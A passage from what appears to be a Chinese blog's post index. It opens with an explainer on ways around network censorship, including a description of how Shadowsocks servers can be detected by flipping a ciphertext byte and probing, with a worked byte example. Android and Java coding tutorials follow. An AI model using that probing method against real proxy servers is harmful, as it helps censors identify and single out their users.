比如我们用HTTPS来访问一个网站，TLS/SSL协议在建连过程如下： 很明显的会发送“client hello”和“server hello” 这种特诊很明显的信息。（当然不会根据这个就封掉，否则https没法用了）。而后续会有服务端证书发送，验证，客户端密钥协商等过程。有明显的协议特征。 下面是网上找的两张图：提醒大家最好不要随便用不安全的VPN来访问不合适的网页，开开android没啥问题。 Socks代理/SSH SocksSOCKS是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。SOCKS是”SOCKetS”的缩写[1]。当防火墙后的客户端要访问外部的服务器时，就跟SOCKS代理服务器连接。这个代理服务器控制客户端访问外网的资格，允许的话，就将客户端的请求发往外部的服务器。这个协议最初由David Koblas开发，而后由NEC的Ying-Da Lee将其扩展到版本4。最新协议是版本5，与前一版本相比，增加支持UDP、验证，以及IPv6。根据OSI模型，SOCKS是会话层的协议，位于表示层与传输层之间 与HTTP代理的对比SOCKS工作在比HTTP代理更低的层次：SOCKS使用握手协议来通知代理软件其客户端试图进行的连接SOCKS，然后尽可能透明地进行操作，而常规代理可能会解释和重写报头（例如，使用另一种底层协议，例如FTP；然而，HTTP代理只是将HTTP请求转发到所需的HTTP服务器）。虽然HTTP代理有不同的使用模式，CONNECT方法允许转发TCP连接；然而，SOCKS代理还可以转发UDP流量和反向代理，而HTTP代理不能。HTTP代理通常更了解HTTP协议，执行更高层次的过滤（虽然通常只用于GET和POST方法，而不用于CONNECT方法） Socks代理本身协议是明文传输，虽然相对HTTP有一些优势，但是明文也导致Socks代理很容易被封。所以可以考虑对Socks进行加密。所以出现了SSH Socks，对于MAC和Linux来说，不需要Client就可以进行访问。详细可以看：SSH隧道技术简介：端口转发&amp;SOCKS代理 但是网上看有些地区好像会对一些VPS的SSH进行端口干扰。我在武汉好像SSH到我的VPS一会就会断。在上海一直没这问题。而且SSH一般是小流量数据，如果数据量特别大，也会被认为是翻墙，进入特别关怀列表。 Shadowsocks认准官网：https://shadowsocks.org/en/index.html （.com那个是卖账号的） 12A secure socks5 proxy,designed to protect your Internet traffic. Shadowsocks 目前不容易被封杀主要是因为： 建立在socks5协议之上，socks5是运用很广泛的协议，所以没办法直接封杀socks5协议 使用socks5协议建立连接，而没有使用VPN中的服务端身份验证和密钥协商过程。而是在服务端和客户端直接写死密钥和加密算法。所以防火墙很难找到明显的特征，因为这就是个普通的socks5协议。 Shadowsock搭建也比较简单，所以很多人自己架设VPS搭建，个人使用流量也很小，没法通过流量监控方式封杀。 自定义加密方式和密钥。因为加密主要主要是防止被检测，所以要选择安全系数高的加密方式。之前RC4会很容易被破解，而导致被封杀。所以现在推荐使用AES加密。而在客户端和服务端自定义密钥，泄露的风险相对较小。 所以如果是自己搭建的Shadosocks被封的概率很小，但是如果是第三方的Shadeowsocks，密码是server定的，你的数据很可能遭受到中间人攻击。 顺便说一下，Shadowssocks是天朝的clowwindy大神写的。不过Shadowsocks项目源码已经从github上删除了并停止维护了，但是release中还有源码可以下载。https://github.com/shadowsocks/shadowsocks Shadowsocks-rss前面认为Shadowssocks特征并不是很明细，但是了解协议工作原理后会发现，SS协议本身还有有漏洞，可以被利用来检测特征，具体讨论看：ShadowSocks协议的弱点分析和改进。 里面中间那些撕逼就不用看了，我总结了下大致意思是：协议过于简单，并且格式固定，很容易被发起中间人攻击。先看看协议结构 12345+--------------+---------------------+------------------+----------+| Address Type | Destination Address | Destination Port | Data |+--------------+---------------------+------------------+----------+| 1 | Variable | 2 | Variable |+--------------+---------------------+------------------+----------+ Possible values of address type are 1 (IPv4), 4 (IPv6), 3 (hostname). For IPv4 address, it’s packed as a 32-bit (4-byte) big-endian integer. For IPv6 address, a compact representation (16-byte array) is used. For hostname, the first byte of destination address indicates the length, which limits the length of hostname to 255. The destination port is also a big-endian integer. The request is encrypted using the specified cipher with a random IV and the pre-shared key, it then becomes so-called payload. 结构很简单，上面解释也很清楚。Client每一个请求都是这种格式，然后进行加密。Server端解密然后解析。看起来没什么问题，没有密钥你无法模拟中间人攻击，也没什么明显特征。但是看看Server处理逻辑会发现存在一些问题： Client数据在加密目前用的最多的是AES系列，加密后在协议数据前会有16位的IV。而Server段解析后，首先判断请求是否有效，而这个判断很简单： 1判断的依据就是Address Type的那个字节，看它是不是在那三个可能取值，如果不是，立即断开连接，如果是，就尝试解析后面的地址和端口进行连接。 如果能发起中间人攻击，模拟Client请求，这个就是一个很明显的特征，如果把Address Type穷举各种情况，其中只有3种情况会连接成功。那么很可能就是一个Shadowsocks 服务器。 所以只需要先劫持一条socks5的请求，因为AES加密后Address Type位置是固定的（第17位），篡改这一位，穷举256种情况（AES-256），然后发送给服务器。如果服务器在3种情况没有关闭连接，就说明这个很可能是Shadowsock服务。你这个IP很快就进入关怀列表了。 这里的关键就是AES加密明文和密文对应关系。密码学不是太懂，贴帖子里面一个回复： 1234567891011121314151617举个例子，现在有一个协议包，共7个字节0x01, 0x08, 0x08, 0x08, 0x08, 0x00, 0x50对照socks5协议，很明显这是一个IPv4包(第一个字节是0x01)，目的地是8.8.8.8的80端口被shadowsocks加密了以后（密码abc，加密方式aes-256-cfb），数据包就变成了这样0xbb, 0x59, 0x1c, 0x4a, 0xb9, 0x0a, 0x91, 0xdc, 0x07, 0xef, 0x72, 0x05, 0x90, 0x42, 0xca, 0x0d, 0x4c, 0x3b, 0x87, 0x8e, 0xca, 0xab, 0x32前16个字节，从0xbb到0x0d，都是iv，根据issue中提到的弱点和之前的总结，只需要修改0x4c，即真正密文中的第一个字节，就可要起到修改明文中的第一个字节的效果。那就把0x4c修改成0x4d吧，解密以后的结果是0x00, 0x08, 0x08, 0x08, 0x08, 0x00, 0x50的确只有第一个字节被改掉了，根据breakwa11的理论，不难推出其他情况，其中合法的是0x4e =&gt; 0x03 (Domain Name)0x49 =&gt; 0x04 (IPv6) 所以目前Shadowsocks应该是比较容易被检测出来。但是为什么没有被封掉，呵呵，就不知道了。所以这个项目目的就是在SS基础上进行一些混淆。因为原有实现确实有漏洞。 不过目前这个项目好像也停止更新了。并且木有开源。 当然如果是自己用完全可以自己修改一个私有协议，这样就没法被检测到了。但是需要同时修改Server段，MAC Client，Windows Client， Android Client。 – -！ GoAgent和GoProxyGoogle App Engine是一个开发、托管网络应用程序的平台，使用Google管理的数据中心 GoAgent的运行原理与其他代理工具基本相同，使用特定的中转服务器完成数据传输。它使用Google App Engine的服务器作为中传，将数据包后发送至Google服务器，再由Google服务器转发至目的服务器，接收数据时方法也类似。由于服务器端软件基本相同，该中转服务器既可以是用户自行架设的服务器，也可以是由其他人架设的开放服务器。 GoAgent其实也是利用GAE作为代理，但是因为他是连接到google的服务器，因为在国内现在google大量被封，所以GoAgent也基本很难使用。目前github上源码也已经删除。 但是GoAgent本身不依赖于GAE，而且使用Python编写，完全可以部署到VPS上进行代理。GoProxy是GoAgent的后续项目https://github.com/phuslu/goproxy还有一个XX-NET：https://github.com/XX-net/XX-Net 有兴趣都可以去了解下。 TorTor（The Onion Router，洋葱路由器）是实现匿名通信的自由软件。Tor是第二代洋葱路由的一种实现，用户通过Tor可以在因特网上进行匿名交流。 Tor: Overview 1The Tor network is a group of volunteer-operated servers that allows people to improve their privacy and security on the Internet. Tor’s users employ this network by connecting through a series of virtual tunnels rather than making a direct connection, thus allowing both organizations and individuals to share information over public networks without compromising their privacy. Along the same line, Tor is an effective censorship circumvention tool, allowing its users to reach otherwise blocked destinations or content. Tor can also be used as a building block for software developers to create new communication tools with built-in privacy features. 下面的图来自官网的介绍。具体内容大家可以自己看，简单说和其他翻墙方式不同，简单可以理解为Tor有一群代理服务器，然后要访问远端站点，是通过随机的代理路径来完成的，数据经历了多个代理服务器的传递。它主要作用是隐藏访问者信息，而翻墙只是顺带的功能。 要访问远程站点，Client需要知道Tor nodes，这些nodes就是普通加入的用户，就好像P2P下载一样。获取nodes信息后，会随机选择一条路径访问。 因为这个原因，Tor的速度可能不会很好。 而关于Tor的漏洞和检测看这里：Tor真的十分安全么 其原理以及漏洞详解! 目前有结合Tor+Shadowsocks前置代理使用的。 ReferenceVPN翻墙，不安全的加密，不要相信墙内公司GFW的工作原理（1） ————GFW是如何识别并封锁翻墙工具的关于翻墙和匿名与网络安全类科普文大集合为什么不应该用 SSL 翻墙科学上网的一些原理","categories":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/categories/计算机网络/"}],"tags":[{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"}]},{"title":"Java构造并初始化Map","slug":"Java构造并初始化Map","date":"2018-06-30T02:16:45.000Z","updated":"2020-05-11T07:23:44.705Z","comments":true,"path":"2018/06/30/Java构造并初始化Map/","link":"","permalink":"https://superxlcr.github.io/2018/06/30/Java构造并初始化Map/","excerpt":"","text":"在Java中，优雅的构造并初始化Map的方式有三种，在此记录一下 static块初始化123456private static final Map&lt;String, String&gt; MAP;static &#123; MAP = new HashMap&lt;String, String&gt;(); MAP.put(\"xx\", \"xx\"); MAP.put(\"yy\", \"yy\");&#125; 双括号初始化（匿名内部类）123HashMap&lt;String, String &gt; h = new HashMap&lt;String, String&gt;()&#123;&#123; put(\"xx\",\"xx\"); &#125;&#125;; 这种写法本质上是创建了一个匿名内部类，因此会持有外部类实例的引用，如果拥有比外部类实例更长的生命周期，有内存泄漏的风险，需要慎重使用 Guava工具包使用Google提供的Guava工具包jcenter库依赖：com.google.guava:guava:21.0 1234567Map&lt;String, Integer&gt; test1 = ImmutableMap.of(\"xx\", 1, \"yy\", 2, \"zz\", 3); // 或者 Map&lt;String, String&gt; test2 = ImmutableMap.&lt;String, String&gt;builder() .put(\"xx\", \"xx\") .put(\"yy\", \"yy\") ... .build();","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"Android瀑布流的一些坑","slug":"Android瀑布流的一些坑","date":"2018-06-23T07:11:51.000Z","updated":"2020-05-11T07:23:44.603Z","comments":true,"path":"2018/06/23/Android瀑布流的一些坑/","link":"","permalink":"https://superxlcr.github.io/2018/06/23/Android瀑布流的一些坑/","excerpt":"","text":"最近实现了一个Android中瀑布流的需求，遇到了一些小坑，在此记录一下 如何实现瀑布流想要实现瀑布流，我们可以使用supportv7包中的RecyclerView来处理使用StaggeredGridLayoutManager，传入每行/每列item的数量以及布局方向即可： 123recyclerView = findViewById(R.id.recycler_view);StaggeredGridLayoutManager layoutManager = new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL);recyclerView.setLayoutManager(layoutManager); 瀑布流分割线如果我们通过设置item的margin以及padding来实现分割线，会出现中间的分割线过粗的问题： 可以看到，中间的分割线大小是旁边分割线的两倍这种情况，我们可以通过自定义RecyclerView.ItemDecoration来实现分割线的功能通过获取getItemOffsets中view的LayoutParams（StaggeredGridLayoutManager中为StaggeredGridLayoutManager.LayoutParams），我们可以获取到具体item在瀑布流中布局的信息（位于某行/某列中的第几位），然后调整相应的绘制区域大小： 1234567891011121314151617181920212223242526272829303132333435private class StaggeredGridItemDecoration extends RecyclerView.ItemDecoration &#123; private int dividerWidth; private int maxSpan; /** * 瀑布流分割线 * * @param dividerWidth 分割线大小 * @param maxSpan 每行/每列最大元素个数 */ public StaggeredGridItemDecoration(int dividerWidth, int maxSpan) &#123; this.dividerWidth = dividerWidth; this.maxSpan = maxSpan; &#125; @Override public void getItemOffsets(Rect outRect, View view, RecyclerView parent, RecyclerView.State state) &#123; if (view.getLayoutParams() instanceof StaggeredGridLayoutManager.LayoutParams) &#123; StaggeredGridLayoutManager.LayoutParams layoutParams = (StaggeredGridLayoutManager.LayoutParams) view.getLayoutParams(); int position = parent.getChildAdapterPosition(view); int spanIndex = layoutParams.getSpanIndex(); int halfDividerWidth = dividerWidth / 2; outRect.left = halfDividerWidth; outRect.right = halfDividerWidth; outRect.top = position &lt; maxSpan ? 0 : dividerWidth; if (spanIndex == 0) &#123; // left outRect.left += halfDividerWidth; &#125; else if (spanIndex == maxSpan - 1) &#123; outRect.right += halfDividerWidth; &#125; &#125; &#125;&#125; 值得注意的是，getItemOffsets中的outRect设置了之后其实达到了一个类似于padding的效果，会占用每个item的大小空间（如item设置的width为200，在设置了左右宽度为20分割线后，实际的item宽度变成了200 - 20 * 2 = 160） 瀑布流错位问题某些情况下，当我们在瀑布流往下滑动一段距离后，再往回滑动时，会发现瀑布流的布局出现了错位的情况刚开始的瀑布流布局： 滑动一段距离，往回滑动后，布局出现了错位且顶部出现了空隙： 一般情况下，在我们停止滑动后，StaggeredGridLayoutManager会自动通过动画效果修复这种空隙的情况如果不希望StaggeredGridLayoutManager自动修复这种空隙的情况，我们可以通过setGapStrategy来处理： 123StaggeredGridLayoutManager layoutManager = new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL);layoutManager.setGapStrategy(StaggeredGridLayoutManager.GAP_HANDLING_NONE); StaggeredGridLayoutManager提供了两种处理空隙的方案，一种是处理，另一种是不处理： 12345678910111213141516171819202122232425/** * Does not do anything to hide gaps. */ public static final int GAP_HANDLING_NONE = 0; /** * When scroll state is changed to &#123;@link RecyclerView#SCROLL_STATE_IDLE&#125;, StaggeredGrid will * check if there are gaps in the because of full span items. If it finds, it will re-layout * and move items to correct positions with animations. * &lt;p&gt; * For example, if LayoutManager ends up with the following layout due to adapter changes: * &lt;pre&gt; * AAA * _BC * DDD * &lt;/pre&gt; * &lt;p&gt; * It will animate to the following state: * &lt;pre&gt; * AAA * BC_ * DDD * &lt;/pre&gt; */ public static final int GAP_HANDLING_MOVE_ITEMS_BETWEEN_SPANS = 2; 对于这种布局出现的空隙的问题，网上一般的解决方案是通过设置GAP_HANDLING_NONE，以及在滑动结束后强制刷新布局解决，代码如下： 12345678910111213layoutManager.setGapStrategy(StaggeredGridLayoutManager.GAP_HANDLING_NONE);recyclerView.addOnScrollListener(new RecyclerView.OnScrollListener() &#123; @Override public void onScrollStateChanged(RecyclerView recyclerView, int newState) &#123; // 滑动停止，刷新布局与分割线 if (newState == RecyclerView.SCROLL_STATE_IDLE) &#123; if (recyclerView.getLayoutManager() instanceof StaggeredGridLayoutManager) &#123; ((StaggeredGridLayoutManager) recyclerView.getLayoutManager()).invalidateSpanAssignments(); recyclerView.invalidateItemDecorations(); &#125; &#125; &#125;&#125;); 遗憾的是，这种方案会使得布局出现闪烁的问题下面，我们通过分析瀑布流错位产生的原因来处理这个问题 item的width以及height改动导致错位stackOverFlow上对于这种情况的回答：https://stackoverflow.com/questions/27636999/staggeredgridlayoutmanager-and-moving-items/27719126#27719126 这种情况错位主要的原因是：由于image加载等情况，在瀑布流布局之后修改了item的width以及height，导致布局出现了空隙对于这种情况，我们通过在RecyclerView.Adapter#onBindViewHolder方法中事先设置好item的大小，避免后续进行修改即可 notifyDataSetChanged导致错位问题在本人进行测试中发现，在没有调用notifyDataSetChanged方法的情况下，瀑布流是一直不会出现错位问题的但是在调用了notifyDataSetChanged方法后，有可能会导致瀑布流出现错位的情况（不一定百分百出现）由于源码太长，就没有仔细去分析了，从结果来看，应该是StaggeredGridLayoutManager本来持有了之前的item的布局情况（关于Span的位置信息），因此一般情况下是不会出现瀑布流错位的问题的但是当我们在调用了notifyDataSetChanged方法之后，由于item被标志为失效了，重新测量布局后可能被放置到了错误的位置，导致了瀑布流错位以及空隙的出现 综上所述，我们应该尽量避免调用notifyDataSetChanged方法，调用其他方法来代替，如添加item时调用notifyItemRangeInserted方法代替","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"view","slug":"view","permalink":"https://superxlcr.github.io/tags/view/"}]},{"title":"字符截断引发的emoji表情乱码问题","slug":"字符截断引发的emoji表情乱码问题","date":"2018-06-19T11:18:00.000Z","updated":"2020-05-11T07:23:44.841Z","comments":true,"path":"2018/06/19/字符截断引发的emoji表情乱码问题/","link":"","permalink":"https://superxlcr.github.io/2018/06/19/字符截断引发的emoji表情乱码问题/","excerpt":"","text":"最近做需求的时候遇到了一个字符串截断导致emoji表情乱码的问题，在此记录一下 背景最近遇到了一个这样的需求：给定一串字符串，截取其中固定长度的字符串下来本以为是一个使用CharSequence#subSequence方法轻松解决的问题，谁知在QA童鞋测试之后就报来了bug：原来字符串中还包含了emoji表情，由于一个emoji表情占用两个char的大小，如果emoji表情刚好在字符串的最后一位，截断之后的表情只剩下一个char的大小，就变成了乱码的形式 Unicode编码在百度了一些相关资料后，我发现该问题与字符编码相关 UnicodeUnicode是计算机领域的一项行业标准，它对世界上绝大部分的文字的进行整理和统一编码，Unicode的编码空间可以划分为17个平面（plane），每个平面包含2的16次方（65536）个码位。17个平面的码位可表示为从U+0000到U+10FFFF，共计1114112个码位，第一个平面称为基本多语言平面（Basic Multilingual Plane, BMP），或称第零平面（Plane 0）。其他平面称为辅助平面（Supplementary Planes）。基本多语言平面内，从U+D800到U+DFFF之间的码位区段是永久保留不映射到Unicode字符，所以有效码位为1112064个。 对于被Unicode收录的字符其编码是唯一且确定的。但是Unicode的实现方式(出于传输、存储、处理或向后兼容的考虑)却有不同的几种，其中最流行的是UTF-8、UTF-16、UCS2、UCS4/UTF-32等，细分的话还有大小端的区别。 对于我们Java而言，可以从char占用2字节来推断出使用的是UTF-16编码 UTF-8我们先来讲讲UTF-8编码，UTF-8是一种变长编码，对于一个Unicode的字符被编码成1至4个字节。Unicode编码与UTF-8的编码的对应关系如下表： Unicode编码 UTF-8编码(二进制) U+0000 – U+007F 0xxxxxxx U+0080 – U+07FF 110xxxxx 10xxxxxx U+0800 – U+FFFF 1110xxxx 10xxxxxx 10xxxxxx U+10000 – U+10FFFF 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx 其中绝大部分的中文用三个字节编码，部分中文用四个字节编码，举例如下: Unicode 字符 UTF-8编码 U+0041 A 0x41 U+7834 破 0xE7 0xA0 0xB4 U+6653 晓 0xE6 0x99 0x93 U+2A6A5 𪚥(四个龍) 0xF0 0xAA 0x9A 0xA5 UTF-16UTF-16是一种变长编码，对于一个Unicode字符被编码成1至2个码元，每个码元为16位 在基本多语言平面（码位范围U+0000-U+FFFF）内的码位UTF-16编码使用1个码元且其值与Unicode是相等的（不需要转换）。举例如下： Unicode 字符 UTF-16（码元） UTF-16 LE（字节） UTF-16 BE（字节） U+0041 A 0x0041 0x41 0x00 0x00 0x41 U+7834 破 0x7834 0x34 0x78 0x78 0x34 U+6653 晓 0x6653 0x53 0x66 0x66 0x53 在辅助平面（码位范围U+10000-U+10FFFF）内的码位在UTF-16中被编码为一对16bit的码元（即32bit,4字节），称作代理对(surrogate pair)。组成代理对的两个码元前一个称为前导代理(lead surrogates)范围为0xD800-0xDBFF，后一个称为后尾代理(trail surrogates)范围为0xDC00-0xDFFF。UTF-16辅助平面代理对与Unicode的对应关系如下表： Lead \\ Trail 0xDC00 0xDC01 … 0xDFFF 0xD800 U+10000 U+10001 … U+103FF 0xD801 U+10400 U+10401 … U+107FF ⋮ ⋮ ⋮ ⋱ ⋮ 0xDBFF U+10FC00 U+10FC01 … U+10FFFF 举例如下： Unicode 字符 UTF-16（码元） UTF-16 LE（字节） UTF-16 BE（字节） U+2A6A5 𪚥 0xD869 0xDEA5 0x69 0xD8 0xA5 0xDE 0xD8 0x69 0xDE 0xA5 Character#isHighSurrogate由上面的UTF-16编码知识可以推断出，我们的emoji表情删除一个char后出现乱码的原因，是因为它是属于UTF-16编码辅助平面内的代理对对于这种情况，我们可以通过Character类的静态方法isHighSurrogate来判断，对于辅助平面内的代理对，做到整个移除或保留即可，isHighSurrogate方法的源码如下： 123456 public static final char MIN_HIGH_SURROGATE = '\\uD800';public static final char MAX_HIGH_SURROGATE = '\\uDBFF'; public static boolean isHighSurrogate(char ch) &#123; return (MIN_HIGH_SURROGATE &lt;= ch &amp;&amp; MAX_HIGH_SURROGATE &gt;= ch); &#125; 本文部分参考自：https://blog.poxiao.me/p/unicode-character-encoding-conversion-in-cpp11/#UTF-16(16-bit_Unicode_Transformation_Format)","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"编码","slug":"编码","permalink":"https://superxlcr.github.io/tags/编码/"}]},{"title":"Intellij / Android Studio 调试 Gradle Plugin","slug":"Intellij-Android-Studio-调试-Gradle-Plugin","date":"2018-06-18T09:44:55.000Z","updated":"2020-05-11T07:23:44.691Z","comments":true,"path":"2018/06/18/Intellij-Android-Studio-调试-Gradle-Plugin/","link":"","permalink":"https://superxlcr.github.io/2018/06/18/Intellij-Android-Studio-调试-Gradle-Plugin/","excerpt":"","text":"本文转载自：https://blog.csdn.net/ceabie/article/details/55271161 网上搜了很久，没发现一篇靠谱的，很多都是版本比较老的Intellij和gradle版本，和现在的都不合适。这里的教程是指 Intellij 2017，以及Android Studio 2.2以上，gradle 2.14.1以后的版本。 当我们需要调试gradle插件时，我们需要执行以下几步： 创建remote调试任务选择 Edit Configurations 点左上角的 + 号，选择 remote。Name可以随意命名，其他配置可以不用动，端口就5005，点ok关闭 使用Terminal窗口（一般在底下的工具栏上）执行任务执行相应的gradle task，并输入debug参数（下面以assembleDebug task 为例）： 1gradlew assembleDebug -Dorg.gradle.daemon=false -Dorg.gradle.debug=true 注意，*.gradle脚本是无法调试的这里最重要的是被调试的构建过程不使用当前的IDE直接运行，最简单就是使用Terminal在Terminal的命令中点回车后，会出现 To honour the JVM settings for this build a new JVM will be forked. 这行提示，并且会一直停在这里，说明在等待调试 开始调试这时候选择第二步中创建的remote任务，并使用调试启动（下图最右边的调试按钮），而不是make或直接运行：","categories":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/categories/gradle/"}],"tags":[{"name":"gradle","slug":"gradle","permalink":"https://superxlcr.github.io/tags/gradle/"}]},{"title":"Android 沉浸式适配","slug":"Android-沉浸式适配","date":"2018-05-19T02:52:18.000Z","updated":"2020-05-11T07:23:44.540Z","comments":true,"path":"2018/05/19/Android-沉浸式适配/","link":"","permalink":"https://superxlcr.github.io/2018/05/19/Android-沉浸式适配/","excerpt":"","text":"最近公司的产品需要进行一波沉浸式UI的改动，在此记录一下躺过的坑 什么是沉浸式传统的手机状态栏是呈现出黑色条状的，有的和手机主界面有很明显的区别。这一样就在一定程度上牺牲了视觉宽度，界面面积变小。沉浸式是APP界面图片延伸到状态栏， 应用本身沉浸于状态栏，如下图所示： 因此，应用想要实现沉浸式的体验，我们主要解决的问题有： 对于一般的toolbar，我们需要修改状态栏的背景颜色 对于其他非纯色作为顶部的页面，我们需要把页面布局延伸至状态栏，这就需要解决全屏带来的键盘无法弹出的问题 对于某些顶部较明亮的配色方案，我们还需要考虑状态栏文字颜色的转换 下面我们来分别讨论下这三个问题 修改状态栏颜色首先，对于api 19 (Android 4.4)以下的状态栏，由于既不支持状态栏透明，也不支持设置状态栏颜色，因此是没法实现沉浸式的 然后，对于api 21 (Android 5.0)以下的状态栏，由于不支持设置状态栏颜色，因此我们只能通过把状态栏设置成透明实现沉浸式： 1activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS); 不过在添加了状态栏透明的flag之后，会导致应用变为全屏模式，因此我们实际的toolbar会被延伸至状态栏，如下图所示：因此，这种情况我们需要自行写一个状态栏去填充位置，并添加相应的padding保持界面布局不与状态栏混在一起综上，对于api 21 (Android 5.0)以下的状态栏，实现代码如下： 1234567891011121314151617181920212223242526272829303132333435@TargetApi(Build.VERSION_CODES.KITKAT) public void setApi19StatusBarColor(Activity activity, @ColorInt int color) &#123; activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS); View fakeStatusBar = addFakeStatusBar(activity); fakeStatusBar.setBackgroundColor(color); &#125; private View addFakeStatusBar(Activity activity) &#123; int statusBarHeight = getStatusBarHeight(activity); View fakeStatusBarView = new View(activity); FrameLayout.LayoutParams params = new FrameLayout.LayoutParams( ViewGroup.LayoutParams.MATCH_PARENT, statusBarHeight); FrameLayout decorView = (FrameLayout) activity.getWindow().getDecorView(); decorView.addView(fakeStatusBarView, params); ViewGroup contentView = decorView.findViewById(android.R.id.content); for (int i = 0; i &lt; contentView.getChildCount(); i++) &#123; View child = contentView.getChildAt(i); child.setPadding(child.getPaddingLeft(), child.getPaddingTop() + statusBarHeight, child.getPaddingRight(), child.getPaddingBottom()); if (child instanceof ViewGroup) &#123; ((ViewGroup) child).setClipToPadding(true); &#125; &#125; return fakeStatusBarView; &#125; private int getStatusBarHeight(Activity activity) &#123; int statusBarHeight = 0; int resourceId = getResources().getIdentifier(\"status_bar_height\", \"dimen\", \"android\"); if (resourceId &gt; 0) &#123; //根据资源ID获取响应的尺寸值 statusBarHeight = getResources().getDimensionPixelSize(resourceId); &#125; return statusBarHeight; &#125; 对于api 21 (Android 5.0)以上的状态栏，由于系统已经为沉浸式提供了良好的支持，直接调用相应的api即可： 123456@TargetApi(Build.VERSION_CODES.LOLLIPOP) public void setApi21StatusBarColor(Activity activity, @ColorInt int color) &#123; activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS); activity.getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS); activity.getWindow().setStatusBarColor(color); &#125; 如何把页面布局延伸至状态栏想要把页面布局延伸至状态栏，我们可以通过设置 FLAG_TRANSLUCENT_STATUS 这个flag来完成： 123456getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS); if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) &#123; getWindow().clearFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS); getWindow().addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION); getWindow().setStatusBarColor(Color.TRANSPARENT); &#125; 对于api 21 (Android 5.0)以上的状态栏，我们还可以通过 FLAG_TRANSLUCENT_NAVIGATION 这个flag跟 setStatusBarColor 这个方法来吧状态栏的阴影去掉达到更好的显示效果 全屏导致的键盘弹出问题当我们通过设置 FLAG_TRANSLUCENT_STATUS 这个flag来把页面布局延伸至状态栏后，我们会发现一个新的问题：对于某些底部拥有输入栏EditText的界面，这个flag属性会导致我们设置的windowSoftInputMode的adjustResize属性失效，导致底部的EditText输入栏无法顶到键盘之上： 这种情况下，我们就可以通过重写顶部ViewGroup的 onApplyWindowInsets 以及 fitSystemWindows 方法解决在设置了fitsSystemWindows属性后，通过重写上述两个方法把除下方外的系统边距去除： 1234567891011121314151617181920212223242526272829303132333435public class MyRelativeLayout extends RelativeLayout &#123; public MyRelativeLayout(Context context) &#123; super(context); setFitsSystemWindows(true); &#125; public MyRelativeLayout(Context context, AttributeSet attrs) &#123; super(context, attrs); setFitsSystemWindows(true); &#125; public MyRelativeLayout(Context context, AttributeSet attrs, int defStyleAttr) &#123; super(context, attrs, defStyleAttr); setFitsSystemWindows(true); &#125; @Override public WindowInsets onApplyWindowInsets(WindowInsets insets) &#123; if (Build.VERSION.SDK_INT &gt; Build.VERSION_CODES.KITKAT) &#123; WindowInsets onlyBottomInsets = insets.replaceSystemWindowInsets(0, 0, 0, insets.getSystemWindowInsetBottom()); return super.onApplyWindowInsets(onlyBottomInsets); &#125; return super.onApplyWindowInsets(insets); &#125; @Override protected boolean fitSystemWindows(Rect insets) &#123; insets.top = 0; insets.left = 0; insets.right = 0; return super.fitSystemWindows(insets); &#125;&#125; 修改状态栏文字颜色由于Android状态栏文字默认的颜色是白色，在我们自定义状态栏的颜色后，对于某些配色较明亮的状态栏背景色而言，可能会导致状态栏文字颜色看不清此时，我们就需要通过去修改状态栏文字颜色来解决这个问题 对于Android 6.0 以下的系统，我们就只能够修改已经公布了相应api的魅族跟小米系统的状态栏文字颜色，而6.0以上的系统则可以通过系统提供的api来解决问题： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129public class StatusTextHelper &#123; private static IStatusTextManager manager = null; static &#123; try &#123; WindowManager.LayoutParams.class.getDeclaredField(\"MEIZU_FLAG_DARK_STATUS_BAR_ICON\"); WindowManager.LayoutParams.class.getDeclaredField(\"meizuFlags\"); manager = new FlymeStatusTextManagerImpl(); &#125; catch (Exception e) &#123; &#125; try &#123; Class.forName(\"android.view.MiuiWindowManager$LayoutParams\"); manager = new MIUIStatusTextManagerImpl(); &#125; catch (Exception e) &#123; &#125; if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.M) &#123; manager = new AndroidMStatusTextManagerImpl(); &#125; &#125; /** * 是否能设置状态栏文字颜色 * * @return boolean */ public static boolean canSetStatusTextMode() &#123; return manager != null; &#125; /** * 设置状态栏文件颜色 * * @param window 窗体 * @param dark 是否为黑色 */ public static void setStatusTextMode(Window window, boolean dark) &#123; if (manager != null) &#123; manager.updateStatusTextMode(window, dark); &#125; &#125; private static class FlymeStatusTextManagerImpl implements IStatusTextManager &#123; @Override public void updateStatusTextMode(Window window, boolean dark) &#123; if (window != null) &#123; try &#123; WindowManager.LayoutParams lp = window.getAttributes(); Field darkFlag = WindowManager.LayoutParams.class .getDeclaredField(\"MEIZU_FLAG_DARK_STATUS_BAR_ICON\"); Field meizuFlags = WindowManager.LayoutParams.class .getDeclaredField(\"meizuFlags\"); darkFlag.setAccessible(true); meizuFlags.setAccessible(true); int bit = darkFlag.getInt(null); int value = meizuFlags.getInt(lp); if (dark) &#123; value |= bit; &#125; else &#123; value &amp;= ~bit; &#125; 